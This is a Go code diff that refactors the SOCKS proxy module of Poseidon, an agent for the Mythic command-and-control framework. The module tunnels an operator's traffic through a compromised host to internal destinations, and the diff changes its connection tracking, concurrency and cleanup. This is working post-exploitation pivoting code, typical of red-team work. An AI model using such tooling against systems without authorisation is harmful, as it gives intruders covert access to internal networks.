@@ -7,14 +7,14 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"io"
 	"net"
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
-	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
@@ -72,21 +72,42 @@ type AddrSpec struct {
 }
 
 // ***** ends section from https://github.com/armon/go-socks5 ********
+type socksTracker struct {
+	Channel    chan structs.SocksMsg
+	Connection net.Conn
+}
 type mutexMap struct {
 	sync.RWMutex
-	m map[int32]chan structs.SocksMsg
+	m map[uint32]socksTracker
 }
 type Args struct {
 	Action string `json:"action"`
 	Port   int    `json:"port"`
 }
 
-var channelMap = mutexMap{m: make(map[int32]chan structs.SocksMsg)}
+var client = &net.TCPAddr{IP: []byte{127, 0, 0, 1}, Port: 65432}
+var channelMap = mutexMap{m: make(map[uint32]socksTracker)}
+
+type addToMap struct {
+	ChannelID  uint32
+	Connection net.Conn
+	NewChannel chan structs.SocksMsg
+}
+
+var addToMapChan = make(chan addToMap)
+var removeFromMapChan = make(chan uint32, 100)
+
+// var sendToMapChan = make(chan structs.SocksMsg)
+var startedGoRoutines = false
 
 func Run(task structs.Task) {
 	args := Args{}
 	err := json.Unmarshal([]byte(task.Params), &args)
-
+	if !startedGoRoutines {
+		//go readFromMythic(profiles.FromMythicSocksChannel, profiles.ToMythicSocksChannel)
+		go handleMutexMapModifications()
+		startedGoRoutines = true
+	}
 	if err != nil {
 		errResp := structs.Response{}
 		errResp.Completed = false
@@ -99,7 +120,7 @@ func Run(task structs.Task) {
 	resp := structs.Response{}
 	if args.Action == "start" {
 		closeAllChannels()
-		go readFromMythic(profiles.FromMythicSocksChannel, profiles.ToMythicSocksChannel)
+
 		resp.UserOutput = "Socks started"
 		resp.Completed = true
 		resp.TaskID = task.TaskID
@@ -113,38 +134,93 @@ func Run(task structs.Task) {
 
 }
 func closeAllChannels() {
+	ids := make([]uint32, len(channelMap.m))
 	channelMap.RLock()
-	for k, v := range channelMap.m {
-		closeMsg := structs.SocksMsg{ServerId: k, Exit: true, Data: ""}
-		v <- closeMsg
+	i := 0
+	for k := range channelMap.m {
+		ids[i] = k
+		i++
 	}
 	channelMap.RUnlock()
+	for _, id := range ids {
+		removeMutexMap(id)
+	}
+	/*
+		for k, v := range channelMap.m {
+			closeMsg := structs.SocksMsg{ServerId: k, Exit: true, Data: ""}
+			v.Channel <- closeMsg
+		}
+		channelMap.RUnlock()
+
+	*/
 }
-func addMutexMap(channelId int32) {
-	in := make(chan structs.SocksMsg, 200)
+func addMutexMap(channelId uint32, conn net.Conn, newChannel chan structs.SocksMsg) {
+	//fmt.Printf("getting Lock to addMutexMap\n")
 	channelMap.Lock()
-	channelMap.m[channelId] = in
+	defer channelMap.Unlock()
+	channelMap.m[channelId] = socksTracker{
+		Channel:    newChannel,
+		Connection: conn,
+	}
+	//channelMap.Unlock()
 	//fmt.Printf("Added new channel to map: %d\n", channelId)
 	//fmt.Printf("now size: %d\n", len(channelMap.m))
-	channelMap.Unlock()
+	//fmt.Printf("released Lock in addMutexMap\n")
 }
-func removeMutexMap(connection int32, conn net.Conn) {
-	//channelMap.Lock()
+func removeMutexMap(connection uint32) {
+	//fmt.Printf("getting Lock in removeMutexMap\n")
+	channelMap.Lock()
+	defer channelMap.Unlock()
 	if _, ok := channelMap.m[connection]; ok {
-		// if this connection still exists, remove it
-		if conn != nil {
-			conn.Close()
-		}
-		close(channelMap.m[connection])
+		close(channelMap.m[connection].Channel)
+		channelMap.m[connection].Connection.Close()
 		delete(channelMap.m, connection)
 		//fmt.Printf("Removed channel (%d) from map, now length %d\n", connection, len(channelMap.m))
 	}
 	//channelMap.Unlock()
+	//fmt.Printf("released Lock in removeMutexMap\n")
 }
-func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksChannel chan structs.SocksMsg) {
+func handleMutexMapModifications() {
 	for {
 		select {
-		case curMsg := <-fromMythicSocksChannel:
+		case msg := <-addToMapChan:
+			channelMap.m[msg.ChannelID] = socksTracker{
+				Channel:    msg.NewChannel,
+				Connection: msg.Connection,
+			}
+		case msg := <-removeFromMapChan:
+			if _, ok := channelMap.m[msg]; ok {
+				close(channelMap.m[msg].Channel)
+				channelMap.m[msg].Connection.Close()
+				delete(channelMap.m, msg)
+				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
+			}
+		case msg := <-profiles.FromMythicSocksChannel:
+			if _, ok := channelMap.m[msg.ServerId]; ok {
+				select {
+				case channelMap.m[msg.ServerId].Channel <- msg:
+				case <-time.After(1 * time.Second):
+					//fmt.Printf("dropping data because channel is full")
+				}
+			} else if !msg.Exit {
+				data, err := base64.StdEncoding.DecodeString(msg.Data)
+				if err != nil {
+					//fmt.Printf("Failed to decode message")
+					continue
+				}
+				go connectToProxy(profiles.FromMythicSocksChannel, msg.ServerId, profiles.ToMythicSocksChannel, data)
+			}
+		}
+	}
+}
+
+/*
+	func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksChannel chan structs.SocksMsg) {
+		for {
+			//fmt.Printf("len of fromMythicSocksChannel: %d\n", len(fromMythicSocksChannel))
+			curMsg := <-fromMythicSocksChannel
+			//fmt.Printf("just got a message from fromMythicSocksChannel\n")
+
 			//now we have a message, process it
 			//fmt.Println("about to lock in mythic read")
 			data, err := base64.StdEncoding.DecodeString(curMsg.Data)
@@ -153,12 +229,12 @@ func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksC
 				continue
 			}
 			// when we take the lock, release if we don't have the current id present
-			//channelMap.RLock()
-			thisChan, ok := channelMap.m[curMsg.ServerId]
-
+			channelMap.RLock()
+			_, ok := channelMap.m[curMsg.ServerId]
+			channelMap.RUnlock()
 			//fmt.Println("just unlocked in mythic read")
 			if !ok {
-				//channelMap.RUnlock()
+				//
 				// we don't have this connection registered, spin off new channel
 				if curMsg.Exit {
 					//fmt.Printf("don't have channel %d, but mythic said exit, just continue loop\n", curMsg.ServerId)
@@ -166,30 +242,34 @@ func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksC
 					continue
 				}
 				//fmt.Printf("about to add to mutex map\n")
-				addMutexMap(curMsg.ServerId)
-				//fmt.Printf("added to mutex map\n")
 				//fmt.Printf("opening new proxy connection\n")
 				go connectToProxy(fromMythicSocksChannel, curMsg.ServerId, toMythicSocksChannel, data)
 				//fmt.Printf("connected to proxy with new connection")
 			} else {
 				// we already have an opened connection, send data to this channel
-				//fmt.Println("sending data to channel for proxy write:")
-				//fmt.Printf("%v", data)
 				if curMsg.Exit {
 					//fmt.Printf("connection exists (%d), but got an exit message, removing mutex\n", curMsg.ServerId)
-					removeMutexMap(curMsg.ServerId, nil)
+					//removeMutexMap(curMsg.ServerId, nil)
 					continue
 				}
 				//fmt.Printf("connection exists, sending data to channel (%d) for proxy write %d\n", curMsg.ServerId, len(curMsg.Data))
-				thisChan <- curMsg
-				//channelMap.RUnlock()
+				channelMap.RLock()
+				if thisSocks, ok := channelMap.m[curMsg.ServerId]; ok {
+					select {
+					case thisSocks.Channel <- curMsg:
+					case <-time.After(1 * time.Second):
+						//fmt.Printf("dropping data because channel is full")
+					}
+				}
+				channelMap.RUnlock()
 			}
+
 		}
 	}
-}
-func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int32, toMythicSocksChannel chan structs.SocksMsg, data []byte) {
+*/
+func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId uint32, toMythicSocksChannel chan structs.SocksMsg, data []byte) {
 	r := bytes.NewReader(data)
-	//fmt.Printf("got connect request: %v, %v\n", data, channelId)
+	////fmt.Printf("got connect request: %v, %v\n", data, channelId)
 	header := []byte{0, 0, 0}
 	if _, err := r.Read(header); err != nil {
 		bytesToSend := SendReply(nil, ServerFailure, nil)
@@ -199,8 +279,8 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.Exit = true
 		toMythicSocksChannel <- msg
 		//fmt.Printf("Telling mythic locally to exit channel in connectToProxy %d, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
-		//go removeMutexMap(channelMap, channelId, nil)
+		//fromMythicSocksChannel <- msg
+		//removeMutexMap(channelId, nil)
 		return
 	}
 	// Ensure we are compatible
@@ -212,8 +292,8 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.Exit = true
 		toMythicSocksChannel <- msg
 		//fmt.Printf("Telling mythic locally to exit channel %d from bad headers, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
-		//go removeMutexMap(channelMap, channelId, nil)
+		//fromMythicSocksChannel <- msg
+		//removeMutexMap(channelId, nil)
 		return
 	}
 	// Read in the destination address
@@ -228,8 +308,8 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.Exit = true
 		toMythicSocksChannel <- msg
 		//fmt.Printf("Telling mythic locally to exit channel %d from bad address, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
-		//go removeMutexMap(channelMap, channelId, nil)
+		//fromMythicSocksChannel <- msg
+		//removeMutexMap(channelId, nil)
 		return
 	}
 
@@ -242,12 +322,11 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 	request.AuthContext = &AuthContext{NoAuth, nil}
 	//fmt.Printf("created auth context\n")
 	// this remote addr is for the attacker, which doesn't matter
-	client := &net.TCPAddr{IP: []byte{127, 0, 0, 1}, Port: 65432}
+
 	request.RemoteAddr = &AddrSpec{IP: client.IP, Port: client.Port}
 	if request.DestAddr.FQDN != "" {
 		//fmt.Printf("about to resolve fqdn\n")
 		addr, err := net.ResolveIPAddr("ip", request.DestAddr.FQDN)
-		//fmt.Printf("got an IP address\n")
 		if err != nil {
 			bytesToSend := SendReply(nil, HostUnreachable, nil)
 			msg := structs.SocksMsg{}
@@ -256,11 +335,12 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 			msg.Exit = true
 			toMythicSocksChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d from unresolved fqdn, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			//fromMythicSocksChannel <- msg
 			//fmt.Printf("Failed to resolve destination '%v': %v\n", dest.FQDN, err)
-			//go removeMutexMap(channelMap, channelId, nil)
+			//removeMutexMap(channelId, nil)
 			return
 		}
+		//fmt.Printf("got an IP address\n")
 		request.DestAddr.IP = addr.IP
 	}
 	//fmt.Printf("switching on the request.Command value\n")
@@ -285,9 +365,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 			msg.Exit = true
 			toMythicSocksChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d from bad command, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
-			//fmt.Printf("Connect to %v failed: %v, %v\n", request.DestAddr, errorMsg, data)
-			//go removeMutexMap(channelMap, channelId, nil)
+			//fromMythicSocksChannel <- msg
+			//fmt.Printf("Connect to %v failed: %v\n", request.DestAddr, errorMsg)
+			//removeMutexMap(channelId, nil)
 			return
 		}
 		// send successful connect message
@@ -298,11 +378,20 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.ServerId = channelId
 		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 		msg.Exit = false
-		//fmt.Printf("channel (%d) Sending %v\n", channelId, msg.Data)
+		//fmt.Printf("adding to mutex map\n")
+
+		recvChan := make(chan structs.SocksMsg, 200)
+		addToMapChan <- addToMap{
+			ChannelID:  channelId,
+			Connection: target,
+			NewChannel: recvChan,
+		}
+		//addMutexMap(channelId, target, recvChan)
+		//fmt.Printf("channel (%d) Sending %v\n", channelId, len(msg.Data))
 		toMythicSocksChannel <- msg
 		//fmt.Printf("spinning off writeToProxy and readFromProxy routines for (%d)\n", channelId)
-		go writeToProxy(fromMythicSocksChannel, target, channelId, toMythicSocksChannel)
-		go readFromProxy(fromMythicSocksChannel, target, toMythicSocksChannel, channelId)
+		go writeToProxy(recvChan, target, channelId, toMythicSocksChannel)
+		go readFromProxy(target, toMythicSocksChannel, channelId)
 	default:
 		//fmt.Printf("In command switch, hit default case\n")
 		bytesToSend := SendReply(nil, CommandNotSupported, nil)
@@ -312,17 +401,16 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.Exit = true
 		toMythicSocksChannel <- msg
 		//fmt.Printf("Telling mythic locally to exit channel %d from default command case, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
+		//fromMythicSocksChannel <- msg
 		//fmt.Printf("Unsupported command: %v, %v\n", request.Command, channelId)
-		//go removeMutexMap(channelMap, channelId, nil)
+		//removeMutexMap(channelId, nil)
 		return
 	}
 	//fmt.Printf("Returning from creating new proxy connection\n")
 }
-func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, toMythicSocksChannel chan structs.SocksMsg, channelId int32) {
-	//numOfZeros := 0
+func readFromProxy(conn net.Conn, toMythicSocksChannel chan structs.SocksMsg, channelId uint32) {
 	for {
-		bufIn := make([]byte, 512000)
+		bufIn := make([]byte, 4096)
 		// Read the incoming connection into the buffer.
 		//conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 		//fmt.Printf("channel (%d) waiting to read from proxy address\n", channelId)
@@ -330,18 +418,19 @@ func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, 
 		//fmt.Printf("channel (%d) totalRead from proxy: %d\n", channelId, totalRead)
 
 		if err != nil {
-			//fmt.Println("Error reading from remote proxy: ", err.Error())
+			fmt.Println("Error reading from remote proxy: ", err.Error())
 			msg := structs.SocksMsg{}
 			msg.ServerId = channelId
-			msg.Data = "" //base64 of -1
+			msg.Data = ""
 			msg.Exit = true
 			toMythicSocksChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
-			conn.Close()
+			//fromMythicSocksChannel <- msg
+			//conn.Close()
 			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
-			//go removeMutexMap(channelMap, channelId, conn)
-			break
+			//go removeMutexMap(channelId)
+			removeFromMapChan <- channelId
+			return
 		}
 		//fmt.Printf("Channel (%d) Got %d bytes from proxy\n", channelId, totalRead)
 		if totalRead > 0 {
@@ -352,22 +441,10 @@ func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, 
 			toMythicSocksChannel <- msg
 		}
 	}
-	//fmt.Printf("channel (%d) proxy connection for reading done\n", channelId)
-	msg := structs.SocksMsg{}
-	msg.ServerId = channelId
-	msg.Data = ""
-	msg.Exit = true
-	//fmt.Printf("Telling mythic locally to exit channel %d reading go routine exiting, exit going back to mythic too\n", channelId)
-	fromMythicSocksChannel <- msg
-	conn.Close()
-	//go removeMutexMap(channelMap, channelId, conn)
 }
-func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, channelId int32, toMythicSocksChannel chan structs.SocksMsg) {
-	channelMap.RLock()
-	myChan := channelMap.m[channelId]
-	channelMap.RUnlock()
+func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint32, toMythicSocksChannel chan structs.SocksMsg) {
 	w := bufio.NewWriter(conn)
-	for bufOut := range myChan {
+	for bufOut := range recvChan {
 		// Send a response back to person contacting us.
 		//fmt.Printf("writeToProxy wants to send %d bytes\n", len(bufOut.Data))
 		if bufOut.Exit {
@@ -376,8 +453,9 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 			w.Flush()
 			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
 			//fromMythicSocksChannel <- bufOut
-			conn.Close()
-			//go removeMutexMap(channelMap, channelId, conn)
+			//conn.Close()
+			//go removeMutexMap(channelId)
+			removeFromMapChan <- channelId
 			return
 		}
 		data, err := base64.StdEncoding.DecodeString(bufOut.Data)
@@ -389,28 +467,31 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 			msg.Data = ""
 			msg.Exit = true
 			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
-			conn.Close()
-			//go removeMutexMap(channelMap, channelId, conn)
+			//fromMythicSocksChannel <- msg
+			//conn.Close()
+			//go removeMutexMap(channelId)
+			removeFromMapChan <- channelId
 			return
 		}
 		_, err = w.Write(data)
 		if err != nil {
-			//fmt.Println("channel (%d) Error writing to proxy: ", channelId, err.Error())
+			fmt.Println("channel (%d) Error writing to proxy: ", channelId, err.Error())
 			msg := structs.SocksMsg{}
 			msg.ServerId = channelId
 			msg.Data = ""
 			msg.Exit = true
 			toMythicSocksChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
-			conn.Close()
+			//fromMythicSocksChannel <- msg
+			//fmt.Printf("told mythic to exit channel %d through fromMythicSocksChannel <- msg\n", channelId)
+			//conn.Close()
 			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
-			//go removeMutexMap(channelMap, channelId, conn)
+			//go removeMutexMap(channelId)
+			removeFromMapChan <- channelId
 			return
 		}
 		w.Flush()
-		//fmt.Printf("total written to proxy: %d\n", totalWritten)
+		////fmt.Printf("total written to proxy: %d\n", totalWritten)
 	}
 	w.Flush()
 	//fmt.Printf("channel (%d) proxy connection for writing closed\n", channelId)
@@ -419,9 +500,10 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 	msg.Data = ""
 	msg.Exit = true
 	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
-	fromMythicSocksChannel <- msg
-	conn.Close()
-	//go removeMutexMap(channelMap, channelId, conn)
+	//fromMythicSocksChannel <- msg
+	//conn.Close()
+	//go removeMutexMap(channelId)
+	removeFromMapChan <- channelId
 	return
 }
 
